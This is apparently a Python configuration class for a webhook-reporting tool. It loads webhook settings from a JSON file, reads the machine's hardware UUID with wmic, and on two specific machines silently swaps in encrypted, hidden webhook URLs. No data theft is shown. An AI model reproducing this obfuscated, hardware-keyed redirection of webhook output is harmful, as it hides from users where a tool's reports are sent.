import json
import subprocess
import encrypt_encode as enc

class Config:
    def __init__(self):
        with open('tools/config.json', 'r') as f:
            self.data = json.load(f)
        self.eb_color = self.data['EB_COLOR']
        self.eb_footer = self.data['EB_FOOTER']
        self.debug_mode = self.data['DEBUG_MODE']
        self.webhook = self.data['HOOK']
        self.wh_avatar = self.data['WH_AVATAR']
        self.wh_name = self.data['WH_NAME']
        
        # Developer Config, don't change, only if you know what you're doing
        self.hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        if self.hwid == enc.decrypt('z75wzo1qiF56uDgrzBGkdo5kM75Xi8i6iDh5uD9JdC1GzC7T', 'fX6QgqlBMs4Cb8Tw2FaVOhyPWNdizDvk0nJxopLAHuSm93e7R1ZKrc5IGEtUjY'):
            self.debug_mode = True
            self.webhook = enc.decrypt('fx6g9xmMTX1hkavt97OEKu2ikz1XKWvhZzgekHQnTFy2kCteZzoiTidI5LbApY3vmh9imY3iphkImhSeYNnxKLdgTsKYZCytfhKeKuDgbFcw5YmgKNntKcKJqatKfCD7VHKtkita3dyBKNnp92QYqibNm3cpm22xZN2JV7nxycO=', 'WQFEva0jzKYqMptNSIVhG5fHd2xPmJu38XwsZD61k4BigLreCyTb79lUAORnoc')
        if self.hwid == enc.decrypt('lqJZ01OqlqzYlqJqleZ70qlIdyl7lqSYlqS70qlUlq5Z01l7', 'fF7Liau3mScMZrOKzpyj9J6BTUAGWoqhRvwg8VCHQbeXkx4nYEt0NDP5sId1l2'):
            self.debug_mode = True
            self.webhook = enc.decrypt('MLtsfLaTbm92MhCwReK2IhkBbcCORv9Zfp2OqDxGMp9OMeaOaWVrCHNsaw21CH2eCWdsUHarCv9KCnqvapazCsqQt6x5Xh2YanKbMwKgIet8WHZSx3t7axxaANSYv0jrUvoYxsxrRL7pvpCBQYxxfe3sCLkcWoqwbhk7Wy==', 'MLmI3cKXo8BCyE1Gd40RWSjVg5ewN27fiDYsJHaUvuQbt6OATZzhFxklqPnpr9')
        
    def get_webhook(self):
        return self.webhook
        
    def get_color(self):
        return self.eb_color
    
    def get_footer(self):
        return self.eb_footer
    
    def get_debug_mode(self):
        return self.debug_mode
    
    def get_avatar(self):
        return self.wh_avatar
    
    def get_name(self):
        return self.wh_name
